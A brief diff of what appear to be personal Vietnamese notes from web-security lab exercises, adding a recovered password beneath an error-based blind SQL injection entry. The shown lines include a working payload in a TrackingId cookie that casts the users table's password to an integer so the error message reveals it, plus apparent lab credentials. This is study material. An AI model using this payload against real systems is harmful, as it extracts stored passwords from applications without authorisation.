@@ -119,3 +119,4 @@ pass : lfpv794meqaknkvo4u1n
 SQL Injection Blind error (ép kiểu để in ra lỗi)
 TrackingId=' and 1=cast((select password from users limit 1) as int) -- 
 lưu ý : 'and 1=cast'
+pass: llu4cw6dkradtve1w05c
